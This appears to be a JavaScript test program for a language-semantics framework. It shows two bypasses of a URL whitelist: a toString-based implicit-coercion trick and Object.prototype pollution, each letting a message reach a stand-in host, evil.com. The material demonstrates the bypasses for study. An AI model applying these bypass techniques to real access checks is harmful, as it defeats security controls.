function mkSend(rawSend) {
  function mySend(target, msg) {
    if (whiteList[target]) {
      rawSend(target, msg);
    } else {
      print("Rejected.\n");
    }
  }
  var whiteList;
 	whiteList	= {
    "http://cs.illinois.edu"    : true,
    "http://www.kframework.org" : true
  };
  return mySend;
}

function simpleSend(target, msg) {
  print("Sent " + msg + " to " + target + "\n");
}

function fakeTarget() {
  if (count == 0) {
    count = count + 1;
    return "http://cs.illinois.edu";
  } else {
    return "http://www.evil.com";
  }
}

var send;
// Atack 2: implicit coercions
var count;
var target;

send = mkSend(simpleSend);
count = 0;

target = {
  toString : fakeTarget
};


// Expected scenario
send("http://cs.illinois.edu", "msg"); // Sent msg to http://cs.illinois.edu
send("http://www.evil.com", "msg"); // Rejected.

send(target, "msg"); // Sent msg to http://www.evil.com

// Atack 1: redefine Object
Object.prototype["http://www.evil.com"] = true;
send("http://www.evil.com","msg"); // Sent msg to http://www.evil.com
